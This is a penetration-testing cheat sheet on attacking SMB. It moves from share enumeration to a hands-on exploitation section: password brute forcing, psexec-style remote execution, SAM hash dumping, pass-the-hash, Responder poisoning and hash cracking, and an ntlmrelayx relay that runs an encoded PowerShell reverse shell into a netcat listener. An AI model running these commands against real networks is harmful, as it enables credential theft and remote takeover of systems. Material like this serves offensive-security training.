# Smb

**SMB** (Server Message Block) is a communication protocol created for providing shared access to files and printers across nodes on a network. It was designed to run on top of NetBIOS over TCP/IP (NBT) using **TCP port 139** and **UDP ports 137** and **138**.  However, with Windows 2000, Microsoft added the option to run SMB directly over **TCP/IP on port 445** without the extra NetBIOS layer. Samba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services. Another protocol that is commonly related to SMB is **MSRPC** (**Microsoft Remote Procedure Call**). 

The vulnerability **EternalBlue** is one of the most famous from Smb.

To check the Samba with Nmap:

```console
zero@pio$ nmap --script smb-os-discovery.nse -p <PORT> <TARGET>
zero@pio$ sudo nmap -sVC -p 139,445 <TARGET>
```

If we want to mount it:
```console
zero@pio$ sudo mount -t cifs -o ro,username=<USERNAME>,password=<PASSWORD> '//<IP>/<SHARED FOLDER>' /mnt/<PATH>
```

## Connection

Samba share folders and files. We can try connecting to it with **smbclient**. First, we need to list all the aviable folders:
```console
zero@pio$ smbclient -N -L \\\\<TARGET>

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        users           Disk      
        IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-N`   | No password   |
| `-L`   | List |

Then we can perform a connection:
```console
zero@pio$ smbclient \\\\<TARGET>\\<FOLDER>
 smb: \>
```

To connect as a user:
```console
zero@pio$ smbclient -U <user> \\\\<ip>\\<folder>
```

**Smbmap** is another tool that helps us enumerate network shares and access associated permissions. An advantage of smbmap is that it provides a list of permissions for each shared folder:
```console
zero@pio$ smbmap -H <TARGET>
```

We can even browser between directories with `-r`:
```console
zero@pio$ smbmap -H <TARGET> -r <FOLDER>
```

Or download and upload:
```console
zero@pio$ smbmap -H <TARGET> --download "<FOLDER>\<FILE>"
zero@pio$ smbmap -H <TARGET> --upload <PATH TO FILE> "<FOLDER>\<OUTPUT FILE>"
```

## Commands in SMB

| **Command**   | **Description**    |
|--------------- | --------------- |
| `ls`   | List files and folders   |
| `cd`   | Change directory   |
| `get <file>`   | Download file in our machine   |
| `exit`   | Exit   |

## RPC 

We can use the rpcclient tool with a null session to enumerate a workstation or Domain Controller.
```console
zero@pio$ rpcclient -U'%' <TARGET>

rpcclient $>
```

## Explotation 

We can use **CrackMapExec** to brute force it:
```console
zero@pio$ crackmapexec smb <TARGET> -u <USER LIST> -p <PASSWORD> -d <DOMAIN>
```

If this user is an Administrator or has specific privileges, we will be able to perform operations such as:
- Remote Command Execution
- Extract Hashes from SAM Database
- Enumerating Logged-on Users
- Pass-the-Hash (PTH)

To perform a RCE we can download [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) from Microsoft website, or we can use some Linux implementations:
- Impacket [PsExec](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py)
- Impacket [SMBExec](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbexec.py)
- Impacket [atexec](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/atexec.py)
- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
- Metasploit [PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md)

For example:
```console
zero@pio$ impacket-psexec <USER>:'<PASSWORD>'@<TARGET>
```

The same options apply to **impacket-smbexec** and **impacket-atexec**. With CrackMapExec:
```console
zero@pio$ crackmapexec smb <TARGET> -u <USER> -p '<PASSWORD>' -x 'whoami' --exec-method smbexec
```

> If the `--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.
{: .prompt-tip}

We can also use it to enumerate loggin users:
```console
zero@pio$ crackmapexec smb <TARGET> -u <USER> -p '<PASSWORD>' --loggedon-users
```

Extract hashes from SAM database:
```console
zero@pio$ crackmapexec smb <TARGET> -u <USER> -p '<PASSWORD>' --sam
```

Pass-the-Hash (PtH):
```console
zero@pio$ crackmapexec smb <TARGET> -u <USER> -H <HASH>
```

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes. The most common tool to perform such operations is the [Responder](https://github.com/lgandx/Responder). Imagine we created a fake SMB server using the Responder default configuration, with the following command:
```console
zero@pio$ responder -I <INTERFACE>
```

On Windows machines, the procedure will roughly be as follows:
1. The hostname file share's IP address is required.
2. The local host file (`C:\Windows\System32\Drivers\etc\hosts`{: .filepath}) will be checked for suitable records.
3. If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
4. Is there no local DNS record? A query will be sent to the DNS server that has been configured.
5. If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. 
```console
zero@pio$ responder -I <INTERFACE>

```

These captured credentials can be cracked using hashcat or relayed to a remote host to complete the authentication and impersonate the user.
```console
zero@pio$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

 If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://raw.githubusercontent.com/lgandx/Responder/master/tools/MultiRelay.py). Let us see an example using **impacket-ntlmrelayx**.

First, we need to set SMB to **OFF** in our responder configuration file (`/etc/responder/Responder.conf`{: .filepath}):
```console
zero@pio$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Then we execute **impacket-ntlmrelayx**. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option `-c`:
```console
zero@pio$ impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET>
```

We can create a PowerShell reverse shell using [revshells](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64):
```console
zero@pio$ impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET> -c 'powershell -e <PAYLOAD>'
```

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.
```console
zero@pio$ nc -lvnp 9000
```
